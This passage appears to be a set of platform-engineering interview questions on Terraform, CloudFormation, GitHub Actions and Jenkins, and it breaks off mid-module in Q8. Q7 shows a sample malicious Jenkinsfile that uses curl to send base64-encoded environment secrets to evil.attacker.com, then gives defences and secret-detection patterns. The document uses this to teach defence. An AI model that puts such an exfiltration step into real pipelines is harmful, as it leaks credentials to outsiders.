# Platform Engineering Mandatory Skills - Deep Tricky Interview Questions & Answers

## Terraform, CloudFormation, GitHub Actions, Jenkins

---

### Q1: Your Terraform state shows a resource exists but it was manually deleted from AWS. When you run `terraform plan`, it shows "no changes." Why doesn't Terraform detect the deletion, and how do you fix it?

**Answer:**

**Why `terraform plan` shows "no changes":**

This is a **trick question**. By default, `terraform plan` DOES run a refresh and SHOULD detect the deletion. If it doesn't, there are specific reasons:

**Scenario 1: Using `-refresh=false`**
```bash
# If someone is running with refresh disabled (bad practice):
terraform plan -refresh=false
# Terraform trusts the state file without verifying AWS → misses deletion
```

**Scenario 2: Cached provider state (Terraform Cloud/Enterprise)**
```
Terraform Cloud may use cached state between runs.
If the refresh fails silently (API throttling, permission issue),
the plan proceeds with stale state data.
```

**Scenario 3: The resource is a data source, not a resource**
```hcl
# Data sources are READ during plan, but if referenced indirectly:
data "aws_ami" "latest" {
  # If this AMI was deregistered, data source fails during plan
  # But a resource block with lifecycle { prevent_destroy = true }
  # might not show deletion if state is stale
}
```

**The REAL tricky scenario: `terraform plan` DOES detect it correctly:**

```
$ terraform plan
# aws_instance.web: Refreshing state... [id=i-0123456789]

# Terraform will perform the following actions:
# aws_instance.web will be created (because it was deleted externally)
+ resource "aws_instance" "web" {
    ...
}

Plan: 1 to add, 0 to change, 0 to destroy.
```

**But what if you DON'T want to recreate it?**

```bash
# Option 1: Remove from state (if resource was intentionally deleted)
terraform state rm aws_instance.web
# Now Terraform forgets about it — no plan changes

# Option 2: Import a replacement resource
terraform import aws_instance.web i-NEW_INSTANCE_ID

# Option 3: Use taint if you want to force recreate differently
terraform taint aws_instance.web
```

**Production-Grade State Drift Detection:**

```python
# Automated drift detection script (runs in CI nightly)
import subprocess
import json

def detect_drift(workspace_path):
    """Run terraform plan and detect drift."""
    result = subprocess.run(
        ['terraform', 'plan', '-detailed-exitcode', '-json', '-refresh=true'],
        cwd=workspace_path,
        capture_output=True, text=True
    )
    
    # Exit codes:
    # 0 = no changes (no drift)
    # 1 = error
    # 2 = changes detected (DRIFT!)
    
    if result.returncode == 2:
        plan_output = json.loads(result.stdout)
        drifted_resources = [
            change for change in plan_output.get('resource_changes', [])
            if change['change']['actions'] != ['no-op']
        ]
        
        alert_drift(drifted_resources)
        return True
    
    return False
```

---

### Q2: Your GitHub Actions workflow takes 45 minutes to complete. It runs on every push to any branch. Developers are complaining about slow feedback. How do you optimize this to under 10 minutes?

**Answer:**

**Current Pipeline Analysis:**

```yaml
# BEFORE: 45 minutes, runs everything on every push
name: CI
on: push

jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - checkout                    # 2 min (full clone)
      - setup-node                  # 3 min (install Node)
      - npm install                 # 8 min (no cache)
      - lint                        # 5 min (all files)
      - unit-tests                  # 10 min (all tests)
      - build                       # 7 min (full build)
      - docker-build                # 5 min (no layer cache)
      - integration-tests           # 15 min (sequential)
      - push-image                  # 3 min
      # Total serial: ~45 min + queue time
```

**AFTER: Optimized Pipeline (< 10 minutes)**

```yaml
name: CI Optimized
on:
  push:
    branches: [main, 'release/**']
    paths-ignore:
      - '**.md'
      - 'docs/**'
      - '.github/ISSUE_TEMPLATE/**'
  pull_request:
    branches: [main]

# Cancel in-progress runs on same branch (no wasted minutes)
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  # Job 1: Quick checks (< 2 min) - fast feedback
  lint-and-typecheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Need history for changed files
      
      # Only lint CHANGED files (not entire repo)
      - name: Get changed files
        id: changed
        run: |
          echo "files=$(git diff --name-only origin/main...HEAD -- '*.ts' '*.tsx' | tr '\n' ' ')" >> $GITHUB_OUTPUT
      
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'  # Cache node_modules
      
      - run: npm ci --prefer-offline  # Faster than npm install
      
      - name: Lint changed files only
        run: npx eslint ${{ steps.changed.outputs.files }} --cache
      
      - name: Type check (incremental)
        run: npx tsc --noEmit --incremental

  # Job 2: Unit tests (parallel with lint, < 5 min)
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        shard: [1, 2, 3, 4]  # Parallel test shards
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      
      - run: npm ci --prefer-offline
      
      # Run 1/4 of tests per shard (parallel)
      - name: Run tests (shard ${{ matrix.shard }}/4)
        run: |
          npx vitest --run --reporter=json \
            --shard=${{ matrix.shard }}/4 \
            --coverage
      
      - name: Upload coverage
        uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ matrix.shard }}
          path: coverage/

  # Job 3: Build + Docker (parallel, uses build cache)
  build:
    runs-on: ubuntu-latest
    needs: [lint-and-typecheck]  # Only after lint passes
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      
      - run: npm ci --prefer-offline
      
      # Turbo/nx build cache (skips unchanged packages)
      - name: Build
        run: npx turbo build --cache-dir=.turbo
      
      # Docker with layer caching (saves ~4 min)
      - uses: docker/setup-buildx-action@v3
      
      - uses: docker/build-push-action@v5
        with:
          context: .
          push: false
          tags: app:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          # GHA cache: stores Docker layers between runs

  # Job 4: Integration tests (only on main/PR, not every push)
  integration-tests:
    if: github.event_name == 'pull_request' || github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    needs: [build, unit-tests]
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_DB: test
          POSTGRES_PASSWORD: test
        ports: ['5432:5432']
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7
        ports: ['6379:6379']
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: 'npm' }
      - run: npm ci --prefer-offline
      - run: npm run test:integration
        env:
          DATABASE_URL: postgres://postgres:test@localhost:5432/test
          REDIS_URL: redis://localhost:6379
```

**Optimization Summary:**

| Technique | Time Saved | Implementation |
|-----------|-----------|----------------|
| Parallel jobs | -15 min | `needs` DAG, matrix strategy |
| npm/Docker cache | -8 min | `cache: 'npm'`, GHA Docker cache |
| Lint only changed files | -4 min | `git diff` + targeted lint |
| Test sharding (4 shards) | -7 min | `--shard=N/4` |
| Cancel in-progress | -∞ | `concurrency.cancel-in-progress` |
| Skip on docs changes | -45 min | `paths-ignore` |
| Shallow clone | -1 min | `fetch-depth: 1` (for builds) |
| **Total** | **< 10 min** | |

---

### Q3: Your Jenkins pipeline uses shared agents. A job ran on an agent that had stale Docker images, cached credentials from another team, and leftover build artifacts. This caused a production deployment with wrong config. How do you prevent this?

**Answer:**

**Root Cause: Shared Mutable State (Pets vs Cattle)**

```
Problem: Jenkins agents are "pets" (long-lived, stateful)
- Stale Docker images from previous builds
- ~/.aws/credentials from other team's job
- /tmp artifacts from previous runs
- npm cache with wrong package versions
- Zombie processes consuming resources
```

**Solution: Ephemeral Agents (Cattle Pattern)**

```groovy
// Jenkinsfile: Use Kubernetes plugin for ephemeral pods
pipeline {
    agent {
        kubernetes {
            yaml """
apiVersion: v1
kind: Pod
metadata:
  labels:
    jenkins-build: "true"
spec:
  serviceAccountName: jenkins-builder
  containers:
    - name: builder
      image: 123456789.dkr.ecr.us-east-1.amazonaws.com/jenkins-builder:v2.1
      command: ['sleep']
      args: ['infinity']
      resources:
        requests:
          cpu: "2"
          memory: "4Gi"
        limits:
          cpu: "4"
          memory: "8Gi"
      volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock
    - name: docker
      image: docker:24-dind
      securityContext:
        privileged: true
      volumeMounts:
        - name: docker-storage
          mountPath: /var/lib/docker
  volumes:
    - name: docker-sock
      emptyDir: {}
    - name: docker-storage
      emptyDir: {}
  # Pod dies after build (ephemeral!)
  # No stale state possible
"""
        }
    }
    
    environment {
        // Credentials from Vault/Secrets Manager (not file-based)
        AWS_CREDENTIALS = credentials('aws-deploy-role')
        // Clean workspace guarantee
        WORKSPACE_CLEAN = 'true'
    }
    
    stages {
        stage('Verify Clean Environment') {
            steps {
                container('builder') {
                    sh '''
                        # Verify no stale credentials
                        test ! -f ~/.aws/credentials || exit 1
                        
                        # Verify clean workspace
                        test -z "$(ls -A ${WORKSPACE})" || echo "Warning: workspace not empty"
                        
                        # Verify Docker is clean
                        docker system prune -af --volumes
                    '''
                }
            }
        }
        
        stage('Build') {
            steps {
                container('builder') {
                    sh '''
                        # Pull exact versions (never use :latest in CI!)
                        docker pull 123456789.dkr.ecr.us-east-1.amazonaws.com/base:v3.2.1
                        
                        # Build with --no-cache for production builds
                        docker build --no-cache \
                            --build-arg VERSION=${GIT_COMMIT} \
                            -t app:${GIT_COMMIT} .
                    '''
                }
            }
        }
        
        stage('Deploy') {
            when { branch 'main' }
            steps {
                container('builder') {
                    // Use IRSA (IAM Roles for Service Accounts) - no stored creds
                    sh '''
                        # AWS credentials via IRSA (pod's service account)
                        aws sts get-caller-identity  # Verify correct role
                        
                        # Deploy with explicit image tag (never :latest)
                        aws ecs update-service \
                            --cluster production \
                            --service app \
                            --task-definition app:${GIT_COMMIT}
                    '''
                }
            }
        }
    }
    
    post {
        always {
            // Pod is destroyed anyway, but be explicit:
            cleanWs()
        }
    }
}
```

**Additional Protections:**

```groovy
// 1. Credential isolation with Jenkins folders
// Each team gets a Jenkins folder with isolated credentials
// Team A cannot access Team B's credentials

// 2. Pod Security Standards (prevent privilege escalation)
// Pod template enforces:
// - No hostPath mounts
// - No privileged containers (except DinD sidecar)
// - Read-only root filesystem
// - Non-root user

// 3. Network policies (prevent pods from reaching other services)
// Jenkins build pods can only reach: ECR, S3, target ECS cluster
```

**Jenkins Shared Library for Standardization:**

```groovy
// vars/standardPipeline.groovy (shared library)
def call(Map config) {
    pipeline {
        agent {
            kubernetes {
                yaml generatePodTemplate(config.language)
            }
        }
        
        options {
            timeout(time: 30, unit: 'MINUTES')
            disableConcurrentBuilds()
            buildDiscarder(logRotator(numToKeepStr: '10'))
        }
        
        stages {
            stage('Checkout') {
                steps {
                    checkout scm
                    // Verify commit is signed (supply chain security)
                    sh 'git verify-commit HEAD || echo "WARNING: unsigned commit"'
                }
            }
            stage('Build') { steps { sh config.buildCmd } }
            stage('Test') { steps { sh config.testCmd } }
            stage('Security Scan') {
                steps {
                    sh 'trivy fs --severity HIGH,CRITICAL --exit-code 1 .'
                }
            }
            stage('Deploy') {
                when { branch 'main' }
                steps { sh config.deployCmd }
            }
        }
    }
}

// Team's Jenkinsfile (simple, standardized):
@Library('platform-shared-lib') _
standardPipeline(
    language: 'python',
    buildCmd: 'docker build -t app .',
    testCmd: 'pytest tests/',
    deployCmd: './deploy.sh'
)
```

---

### Q4: You have 200 CloudFormation stacks across 20 accounts. A nested stack update is stuck in `UPDATE_ROLLBACK_FAILED` state. You can't delete it, can't update it, and it's blocking other deployments. How do you recover?

**Answer:**

**Understanding the Problem:**

```
Stack State Machine:
CREATE_COMPLETE → UPDATE_IN_PROGRESS → UPDATE_COMPLETE
                                     → UPDATE_FAILED → UPDATE_ROLLBACK_IN_PROGRESS
                                                     → UPDATE_ROLLBACK_COMPLETE (safe)
                                                     → UPDATE_ROLLBACK_FAILED (STUCK!)

UPDATE_ROLLBACK_FAILED means:
- The update failed
- The rollback ALSO failed
- Stack is in a "broken" state
- Cannot update, cannot easily delete
```

**Root Causes of UPDATE_ROLLBACK_FAILED:**

1. Resource was manually deleted (CFN can't roll back to something that doesn't exist)
2. IAM permissions changed mid-update (CFN can't undo what it just did)
3. Resource dependency issue (ordering problem during rollback)
4. Nested stack failure cascading to parent

**Recovery Procedure:**

```bash
# Step 1: Identify which resources failed during rollback
aws cloudformation describe-stack-events \
  --stack-name my-stuck-stack \
  --query "StackEvents[?ResourceStatus=='UPDATE_FAILED']" \
  --output table

# Output shows which resources are problematic:
# MyEC2Instance: "Instance i-xxx does not exist"
# MySecurityGroup: "Resource sg-xxx cannot be found"
```

```bash
# Step 2: Continue update rollback, SKIPPING the broken resources
aws cloudformation continue-update-rollback \
  --stack-name my-stuck-stack \
  --resources-to-skip "MyEC2Instance" "MySecurityGroup"
  
# This tells CloudFormation:
# "I know these resources are gone. Skip them and complete the rollback."
# Stack transitions: UPDATE_ROLLBACK_FAILED → UPDATE_ROLLBACK_COMPLETE
```

```bash
# Step 3: After rollback completes, fix the state
# The skipped resources are now "gone" from CloudFormation's perspective
# but the stack is in UPDATE_ROLLBACK_COMPLETE (functional state)

# Option A: Import the missing resources back
aws cloudformation create-change-set \
  --stack-name my-stuck-stack \
  --change-set-name import-missing \
  --change-set-type IMPORT \
  --resources-to-import "[{
    \"ResourceType\":\"AWS::EC2::Instance\",
    \"LogicalResourceId\":\"MyEC2Instance\",
    \"ResourceIdentifier\":{\"InstanceId\":\"i-new-instance-id\"}
  }]" \
  --template-body file://template.yaml

# Option B: Update the stack to recreate missing resources
aws cloudformation update-stack \
  --stack-name my-stuck-stack \
  --template-body file://template.yaml \
  --parameters file://params.json
```

**For Nested Stacks (Extra Complexity):**

```bash
# If a NESTED stack is stuck, you must fix it from the parent:

# Step 1: Find the nested stack that's stuck
aws cloudformation describe-stack-resources \
  --stack-name parent-stack \
  --query "StackResources[?ResourceStatus=='UPDATE_ROLLBACK_FAILED']"

# Step 2: Continue rollback on the NESTED stack first
aws cloudformation continue-update-rollback \
  --stack-name arn:aws:cloudformation:us-east-1:123456789:stack/parent-NestedStack-XXXX/guid \
  --resources-to-skip "ProblematicResource"

# Step 3: Then continue rollback on the parent
aws cloudformation continue-update-rollback \
  --stack-name parent-stack
```

**Nuclear Option (Last Resort):**

```bash
# If nothing works — DELETE with retain:
aws cloudformation delete-stack \
  --stack-name my-stuck-stack \
  --retain-resources "MyEC2Instance" "MyRDSInstance" "MyS3Bucket"
  
# This deletes the STACK (CloudFormation metadata)
# but RETAINS the actual AWS resources
# Then recreate the stack and IMPORT the retained resources

# WARNING: You lose stack history, outputs, and cross-stack references
```

**Prevention:**

```yaml
# 1. Always use change sets (preview before apply)
aws cloudformation create-change-set ...
aws cloudformation describe-change-set ...  # REVIEW
aws cloudformation execute-change-set ...    # Only if looks good

# 2. Use stack policies to prevent accidental deletes
StackPolicy:
  Statement:
    - Effect: Deny
      Action: "Update:Replace"
      Principal: "*"
      Resource: "LogicalResourceId/ProductionDatabase"
      # Prevents CloudFormation from replacing your database

# 3. DeletionPolicy on critical resources
Resources:
  ProductionDatabase:
    Type: AWS::RDS::DBCluster
    DeletionPolicy: Retain  # Never delete even if stack is deleted
    UpdateReplacePolicy: Retain
```

---

### Q5: Your Terraform codebase has grown to 2000+ resources. `terraform plan` takes 20 minutes and sometimes times out. The team wants to split the state but is afraid of breaking cross-resource references. How do you safely decompose?

**Answer:**

**Strategy: Layered State Decomposition with Data Sources**

```
BEFORE (Monolithic):
┌─────────────────────────────────────────┐
│  Single State: 2000+ resources          │
│  Plan time: 20 min                      │
│  Blast radius: Everything               │
│  Team conflicts: Constant               │
└─────────────────────────────────────────┘

AFTER (Layered):
┌────────────────┐  ┌────────────────┐  ┌────────────────┐
│ Layer 1:       │  │ Layer 2:       │  │ Layer 3:       │
│ Foundation     │  │ Data Platform  │  │ Applications   │
│ (50 resources) │  │ (200 resources)│  │ (500 per team) │
│ Plan: 1 min   │  │ Plan: 3 min   │  │ Plan: 2 min   │
│ Changes: rare  │  │ Changes: weekly│  │ Changes: daily │
└───────┬────────┘  └───────┬────────┘  └───────┬────────┘
        │                    │                    │
        └────────────────────┴────────────────────┘
        Cross-layer references via: terraform_remote_state
                                    OR data sources
```

**Step-by-Step Safe Decomposition:**

```hcl
# Step 1: Identify natural boundaries (layers that change at different rates)
# Foundation: VPC, TGW, DNS, IAM baseline (changes monthly)
# Data: RDS, ElastiCache, MSK, S3 buckets (changes weekly)
# Apps: ECS services, Lambda, ALBs (changes daily)

# Step 2: Create new state for one layer (start with Foundation)
# In new directory: infrastructure/foundation/

terraform {
  backend "s3" {
    bucket = "terraform-state"
    key    = "foundation/terraform.tfstate"
    region = "us-east-1"
  }
}

# Move resources from old state to new state:
# terraform state mv -state-out=foundation.tfstate aws_vpc.main aws_vpc.main
```

```bash
# Step 3: Move resources safely (one at a time, with verification)

# Pull current state
terraform state pull > current.tfstate

# Move VPC resources to foundation state
terraform state mv \
  -state=current.tfstate \
  -state-out=foundation/terraform.tfstate \
  'aws_vpc.main' 'aws_vpc.main'

terraform state mv \
  -state=current.tfstate \
  -state-out=foundation/terraform.tfstate \
  'aws_subnet.private[0]' 'aws_subnet.private[0]'

# After each move, run plan in BOTH states to verify no drift:
cd foundation && terraform plan  # Should show no changes
cd ../monolith && terraform plan  # Should show no changes (just fewer resources)
```

**Step 4: Cross-State References**

```hcl
# Option A: terraform_remote_state (tight coupling, simple)
# In applications/main.tf:
data "terraform_remote_state" "foundation" {
  backend = "s3"
  config = {
    bucket = "terraform-state"
    key    = "foundation/terraform.tfstate"
    region = "us-east-1"
  }
}

resource "aws_ecs_service" "app" {
  # Reference VPC from foundation state
  network_configuration {
    subnets = data.terraform_remote_state.foundation.outputs.private_subnet_ids
  }
}

# Option B: Data sources (loose coupling, more resilient)
# In applications/main.tf:
data "aws_vpc" "main" {
  tags = { Name = "production-vpc" }
}

data "aws_subnets" "private" {
  filter {
    name   = "vpc-id"
    values = [data.aws_vpc.main.id]
  }
  filter {
    name   = "tag:Tier"
    values = ["private"]
  }
}

resource "aws_ecs_service" "app" {
  network_configuration {
    subnets = data.aws_subnets.private.ids
  }
}
```

**Option B is preferred because:**
- No dependency on other team's state file
- Works even if foundation state is locked/corrupted
- Clear API contract (tags) vs implementation detail (state structure)
- Can read from ANY account (cross-account data sources)

**Step 5: Terragrunt for DRY Cross-Layer Dependencies**

```hcl
# infrastructure/production/applications/team-a/terragrunt.hcl
terraform {
  source = "../../../../modules//ecs-service"
}

include "root" {
  path = find_in_parent_folders()
}

dependency "foundation" {
  config_path = "../../foundation"
  
  # Mock outputs for `plan` when foundation hasn't been applied yet
  mock_outputs = {
    vpc_id             = "vpc-mock"
    private_subnet_ids = ["subnet-mock-1", "subnet-mock-2"]
  }
  mock_outputs_allowed_terraform_commands = ["plan", "validate"]
}

dependency "data_platform" {
  config_path = "../../data-platform"
}

inputs = {
  vpc_id       = dependency.foundation.outputs.vpc_id
  subnet_ids   = dependency.foundation.outputs.private_subnet_ids
  db_endpoint  = dependency.data_platform.outputs.rds_endpoint
  redis_endpoint = dependency.data_platform.outputs.redis_endpoint
}
```

**Automation: Bulk State Move Script**

```python
#!/usr/bin/env python3
"""Safely move resources between Terraform states with verification."""

import subprocess
import json
import sys

def move_resources(source_dir, target_dir, resources):
    """Move resources with plan verification at each step."""
    
    for resource in resources:
        print(f"\n{'='*60}")
        print(f"Moving: {resource}")
        print(f"{'='*60}")
        
        # Move resource
        result = subprocess.run(
            ['terraform', 'state', 'mv', 
             f'-state={source_dir}/terraform.tfstate',
             f'-state-out={target_dir}/terraform.tfstate',
             resource, resource],
            capture_output=True, text=True
        )
        
        if result.returncode != 0:
            print(f"ERROR: {result.stderr}")
            print("ABORTING — manual intervention needed")
            sys.exit(1)
        
        # Verify source state (should show no changes for moved resource)
        verify_plan(source_dir, f"after removing {resource}")
        
        # Verify target state (should show no changes)
        verify_plan(target_dir, f"after adding {resource}")
        
        print(f"✅ Successfully moved: {resource}")

def verify_plan(directory, context):
    """Run terraform plan and verify no unexpected changes."""
    result = subprocess.run(
        ['terraform', 'plan', '-detailed-exitcode'],
        cwd=directory, capture_output=True, text=True
    )
    if result.returncode == 2:
        print(f"⚠️  Plan shows changes in {directory} ({context})")
        print(result.stdout[-500:])  # Last 500 chars
        response = input("Continue? (y/n): ")
        if response.lower() != 'y':
            sys.exit(1)

# Usage:
resources_to_move = [
    'aws_vpc.main',
    'aws_subnet.private["us-east-1a"]',
    'aws_subnet.private["us-east-1b"]',
    'aws_route_table.private',
    'aws_nat_gateway.main',
    'aws_eip.nat',
]
move_resources('monolith/', 'foundation/', resources_to_move)
```

---

### Q6: Your GitHub Actions workflow needs to deploy to AWS but you're storing AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY as repository secrets. Security audit flagged this. What's the proper approach?

**Answer:**

**Why Stored Keys Are Dangerous:**

```
Risks of long-lived credentials in GitHub Secrets:
1. Keys never rotate automatically (manual process, often forgotten)
2. Any workflow on any branch can access them (no branch restriction)
3. If GitHub is breached, all keys are exposed
4. No way to scope keys to specific workflow/job
5. Keys can be exfiltrated in workflow logs (printenv, echo)
6. Fork PRs may access secrets (misconfiguration)
```

**Solution: OIDC (OpenID Connect) — Zero Stored Credentials**

```yaml
# .github/workflows/deploy.yml
name: Deploy to Production
on:
  push:
    branches: [main]

permissions:
  id-token: write   # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Requires approval + limits secret access
    
    steps:
      - uses: actions/checkout@v4
      
      # OIDC: GitHub proves identity to AWS, gets temporary credentials
      # No stored secrets! Credentials valid for 1 hour only.
      - name: Configure AWS Credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeployRole
          aws-region: us-east-1
          role-session-name: github-${{ github.run_id }}
          # Optional: scope session further
          role-duration-seconds: 900  # 15 minutes (minimum needed)
      
      - name: Deploy
        run: |
          aws ecs update-service \
            --cluster production \
            --service app \
            --force-new-deployment
```

**AWS Side: OIDC Provider + Restricted Role**

```hcl
# Step 1: GitHub OIDC Provider (one-time setup)
resource "aws_iam_openid_connect_provider" "github" {
  url = "https://token.actions.githubusercontent.com"
  
  client_id_list = ["sts.amazonaws.com"]
  
  # GitHub's OIDC thumbprint
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}

# Step 2: IAM Role with strict trust policy
resource "aws_iam_role" "github_deploy" {
  name = "GitHubActionsDeployRole"
  
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = {
        Federated = aws_iam_openid_connect_provider.github.arn
      }
      Action = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringEquals = {
          # Only from OUR GitHub org
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
        }
        StringLike = {
          # CRITICAL: Restrict to specific repos AND branches
          "token.actions.githubusercontent.com:sub" = [
            "repo:myorg/myapp:ref:refs/heads/main",
            "repo:myorg/myapp:environment:production"
          ]
          # This means:
          # - ONLY myorg/myapp repo can assume this role
          # - ONLY from main branch OR production environment
          # - Feature branches CANNOT access production credentials
        }
      }
    }]
  })
}

# Step 3: Least-privilege permissions (only what deploy needs)
resource "aws_iam_role_policy" "github_deploy" {
  role = aws_iam_role.github_deploy.id
  
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "ecs:UpdateService",
          "ecs:DescribeServices",
          "ecs:RegisterTaskDefinition",
          "ecs:DescribeTaskDefinition"
        ]
        Resource = [
          "arn:aws:ecs:us-east-1:123456789012:service/production/app",
          "arn:aws:ecs:us-east-1:123456789012:task-definition/app:*"
        ]
      },
      {
        Effect = "Allow"
        Action = [
          "ecr:GetAuthorizationToken",
          "ecr:BatchGetImage",
          "ecr:GetDownloadUrlForLayer"
        ]
        Resource = "*"
      },
      {
        # EXPLICIT DENY of dangerous actions
        Effect = "Deny"
        Action = [
          "iam:*",
          "organizations:*",
          "ecs:DeleteService",
          "ecs:DeleteCluster",
          "rds:DeleteDB*"
        ]
        Resource = "*"
      }
    ]
  })
}
```

**Multi-Environment OIDC Pattern:**

```yaml
# Different roles per environment (different trust policies)
jobs:
  deploy-staging:
    environment: staging  # Maps to staging role (broader permissions)
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::STAGING_ACCT:role/GitHubActionsRole
          
  deploy-production:
    needs: deploy-staging
    environment: production  # Maps to production role (tighter permissions)
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::PROD_ACCT:role/GitHubActionsRole
```

**Security Comparison:**

| Feature | Stored Keys | OIDC |
|---------|:-----------:|:----:|
| Key rotation | Manual | Automatic (every request) |
| Branch restriction | ❌ | ✅ (via sub claim) |
| Credential lifetime | Permanent | 15 min - 1 hour |
| Repo restriction | ❌ | ✅ (via sub claim) |
| Audit trail | Limited | Full (CloudTrail shows GitHub run ID) |
| Risk if GitHub breached | Keys exposed | Nothing to steal |
| Environment gating | Manual | Built-in |

---

### Q7: Your Jenkins pipeline builds and pushes Docker images. Recently, a developer injected `printenv` into the Jenkinsfile and exfiltrated AWS credentials from the build environment to an external endpoint. How do you prevent this class of attacks?

**Answer:**

**The Attack:**
```groovy
// Malicious Jenkinsfile (submitted via PR)
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                // Looks innocent but exfiltrates credentials
                sh '''
                    curl -X POST https://evil.attacker.com/collect \
                      -d "$(env | base64)"
                '''
                // Or more subtle:
                sh 'docker build --build-arg SECRETS="$(env)" .'
            }
        }
    }
}
```

**Multi-Layer Defense:**

**Layer 1: Prevent Credential Exposure in Environment**

```groovy
// Use Jenkins Credentials Binding (short-lived, scoped)
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                // Credentials only available in this block
                withCredentials([
                    [$class: 'AmazonWebServicesCredentialsBinding',
                     credentialsId: 'aws-deploy',
                     accessKeyVariable: 'AWS_ACCESS_KEY_ID',
                     secretKeyVariable: 'AWS_SECRET_ACCESS_KEY']
                ]) {
                    sh 'aws ecs update-service ...'
                }
                // Credentials NOT available here
            }
        }
    }
}

// BETTER: Use IRSA/instance profile (no env vars at all)
// Jenkins agent pod has IAM role via service account
// No credentials in environment to steal
```

**Layer 2: Network Egress Control**

```yaml
# Kubernetes NetworkPolicy: Jenkins pods can only reach allowed endpoints
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: jenkins-agent-egress
  namespace: jenkins
spec:
  podSelector:
    matchLabels:
      jenkins-agent: "true"
  policyTypes: ["Egress"]
  egress:
    # Allow DNS
    - to:
        - namespaceSelector: {}
      ports:
        - protocol: UDP
          port: 53
    # Allow ECR (for docker push)
    - to:
        - ipBlock:
            cidr: 10.0.0.0/8  # VPC endpoints only
      ports:
        - protocol: TCP
          port: 443
    # Allow Jenkins controller
    - to:
        - podSelector:
            matchLabels:
              app: jenkins-controller
      ports:
        - protocol: TCP
          port: 50000
    # DENY ALL OTHER EGRESS (blocks curl to evil.attacker.com)
```

**Layer 3: Jenkinsfile Sandboxing**

```groovy
// Jenkins Script Security Plugin + Sandbox
// In Jenkins > Manage Jenkins > Script Security:
// - Enable Groovy Sandbox for all pipeline scripts
// - Block dangerous methods: System.getenv(), Runtime.exec()
// - Whitelist only approved steps

// Organizational Jenkinsfile (approved by admin):
@Library('approved-shared-lib@v2.1') _

// Developers can only call pre-approved functions:
standardPipeline(
    service: 'my-app',
    buildCmd: 'docker build -t app .',
    // NO ability to run arbitrary sh commands
)
```

**Layer 4: Branch Protection + Jenkinsfile Review**

```yaml
# GitHub Branch Protection:
# - Require PR review for Jenkinsfile changes
# - CODEOWNERS file:
# Jenkinsfile @platform-team  # Only platform team can approve

# Jenkins: Trust only Jenkinsfile from main branch
// In Jenkins job configuration:
// Pipeline > Definition > "Pipeline script from SCM"
// Script Path: Jenkinsfile
// Lightweight checkout: OFF (verify full repo)
// Branches to build: */main  (don't build arbitrary branches)
```

**Layer 5: Runtime Secrets Detection**

```groovy
// Shared library: Scan build output for credential leaks
def call(Map config) {
    pipeline {
        agent { kubernetes { yaml podTemplate() } }
        
        stages {
            stage('Build') {
                steps {
                    script {
                        // Capture output and scan for secrets
                        def output = sh(script: config.buildCmd, returnStdout: true)
                        
                        // Check for credential patterns in output
                        def patterns = [
                            ~/AKIA[0-9A-Z]{16}/,        // AWS Access Key
                            ~/[0-9a-zA-Z/+]{40}/,       // AWS Secret Key pattern
                            ~/ghp_[a-zA-Z0-9]{36}/,     // GitHub PAT
                            ~/-----BEGIN.*KEY-----/,     // Private keys
                        ]
                        
                        patterns.each { pattern ->
                            if (output =~ pattern) {
                                error("SECURITY: Potential credential leak detected in build output!")
                            }
                        }
                    }
                }
            }
        }
        
        post {
            always {
                // Audit log: Record all env vars accessed (not values!)
                sh 'env | cut -d= -f1 | sort > /tmp/env-keys.txt'
                archiveArtifacts artifacts: '/tmp/env-keys.txt'
            }
        }
    }
}
```

**Layer 6: Use Vault for Dynamic Secrets**

```groovy
// HashiCorp Vault: Secrets generated on-demand, auto-expire
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                // Vault generates temporary AWS credentials (15 min TTL)
                withVault([
                    vaultSecrets: [
                        [path: 'aws/creds/deploy-role',
                         secretValues: [
                             [envVar: 'AWS_ACCESS_KEY_ID', vaultKey: 'access_key'],
                             [envVar: 'AWS_SECRET_ACCESS_KEY', vaultKey: 'secret_key'],
                             [envVar: 'AWS_SESSION_TOKEN', vaultKey: 'security_token']
                         ]]
                    ]
                ]) {
                    sh 'aws ecs update-service ...'
                }
                // Credentials automatically revoked after block exits
            }
        }
    }
}
```

---

### Q8: You need to implement a Terraform module that creates an ECS service. The module must work for both development (minimal resources, no HA) and production (multi-AZ, auto-scaling, circuit breaker). How do you design this without code duplication?

**Answer:**

**Design Pattern: Configuration-Driven Module with Tier Presets**

```hcl
# modules/ecs-service/variables.tf

variable "service_name" {
  type        = string
  description = "Name of the ECS service"
}

variable "tier" {
  type        = string
  description = "Service tier: determines HA, scaling, and monitoring defaults"
  default     = "standard"
  
  validation {
